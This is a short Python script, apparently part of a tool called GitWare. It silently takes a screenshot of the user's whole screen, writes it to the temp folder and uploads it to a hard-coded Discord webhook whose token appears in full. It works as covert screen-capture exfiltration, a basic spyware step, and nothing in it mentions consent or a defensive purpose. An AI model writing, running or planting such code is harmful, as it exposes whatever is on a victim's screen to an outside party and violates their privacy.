import requests
import io
import os
import PIL

webhook_url="https://discord.com/api/webhooks/1426929306164002818/Nv5g-5Z8yoW5hHGIPSIoLgHRR2jX2Hj8DeWcry6wIKzETvnRYI8fp81tK56xuo6KzKpH"
screenshot=PIL.ImageGrab.grab()
temp_path=os.path.join(os.getenv("TEMP") or os.getenv("TMP") or ".", "screenshot.png")
screenshot.save(temp_path,format="PNG")
with open(temp_path,"rb") as f:
    files={"file":("screenshot.png",f,"image/png")}
    data={"content":"Here’s the latest screenshot","username":"GitWare Bot", "avatar":"https://github.com/orkkz/GitWare/blob/main/resources/gitware_symbol.png?raw=true"}
    requests.post(webhook_url,data=data,files=files)
